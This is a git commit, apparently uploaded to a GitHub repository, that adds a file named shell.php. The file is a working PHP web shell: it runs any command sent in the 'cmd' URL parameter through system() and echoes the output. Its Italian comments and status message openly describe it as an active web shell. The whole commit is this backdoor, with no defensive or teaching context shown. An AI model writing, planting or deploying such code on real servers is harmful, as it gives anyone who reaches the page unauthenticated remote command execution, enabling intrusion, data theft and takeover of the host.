a9b9b98c2d9426fec116cf9924a01e94bf2a6aeb
Simone <136982853+SimoneSicolo@users.noreply.github.com>
2026-04-07 11:30:03 +0200

    Add files via upload

---
+++ shell.php
@@ -0,0 +1,11 @@
+<?php
+    // Questa riga permette di eseguire comandi passati 
+    //tramite il parametro 'cmd' nell'URL
+    if(isset($_GET['cmd'])) {
+        echo "<pre>";
+        system($_GET['cmd']);
+        echo "</pre>";
+    } else {
+        echo "Web Shell attiva. Usa ?cmd=comando nell'URL.";
+    }
+?>
